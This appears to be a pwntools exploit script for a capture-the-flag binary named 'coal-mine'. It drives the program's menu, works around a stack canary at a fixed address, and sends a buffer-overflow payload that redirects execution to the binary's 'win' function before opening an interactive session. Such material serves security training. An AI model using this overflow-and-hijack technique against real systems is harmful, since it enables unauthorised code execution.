from pwn import *

file = ELF("./coal-mine")

if args.HOST and args.PORT:
    p = remote(args.HOST, args.PORT)
elif args.GDB:
    p = process("./run.sh", env={ "QEMU_GDB": "1337" })
else:
    p = process("./run.sh")

def mine(addr, depth):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", f"{addr}".encode())
    p.sendlineafter(b"> ", f"{depth}".encode())

def extr(index):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", f"{index}".encode())

def ropr(payload):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", payload)

def stop():
    p.sendlineafter(b"> ", b"4")

canary = 0x00021038

payload = b"A" * 0x30
payload += p32(file.sym.win)

ropr(payload)
mine(canary, 2)

extr(0x20 // 4)
stop()

p.interactive()